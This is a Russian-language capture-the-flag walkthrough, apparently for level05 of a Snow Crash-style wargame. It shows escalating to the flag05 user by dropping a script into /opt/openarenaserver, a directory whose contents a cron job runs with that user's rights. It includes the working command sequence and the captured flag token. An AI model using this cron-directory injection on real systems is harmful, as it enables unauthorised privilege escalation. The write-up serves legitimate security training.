```
ls -l
```
> total 0

В HOME ничего нет, значит надо искать нужный файл

```
find / -name level05 2>/dev/null
```
> /var/mail/level05\
/rofs/var/mail/level05

Смотрм содержимое файла
```
cat /var/mail/level05
```
> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

*/2 * * * * говорит о том, что это cron выполняет скрипт раз в 2 минуты
Посмотрим кому пренадлежит данный файл
```
ls -l /usr/sbin/openarenaserver
```
> -rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver

-c говорит о том, что выполняется данная программа, посмотрим, ее содержимое

```
cat /usr/sbin/openarenaserver
```
> #!/bin/sh\
\
for i in /opt/openarenaserver/* ; do\
	(ulimit -t 5; bash -x "$i")\
	rm -f "$i"\
done

ulimit -t 5 (cpu time               (seconds, -t) unlimited) Ограничивает время на 5 секунд для текущего процесса оболочки
bash -x выполняет бинарный файл, если это возможно

В данном скрипте видно что в директории /opt/openarenaserver/ ищутся исполняемы файлы и исполняются, так как файл запущен от flag05
нам необходимо подсунуть ему файл, который выполнит getflag

```
echo "/bin/getflag > /tmp/flag" > /opt/openarenaserver/exploit; chmod +x /opt/openarenaserver/exploit
```

Когда скрипт отработал в файле появилось содержимое

```
cat /tmp/flag
```
> Check flag.Here is your token : viuaaale9huek52boumoomioc
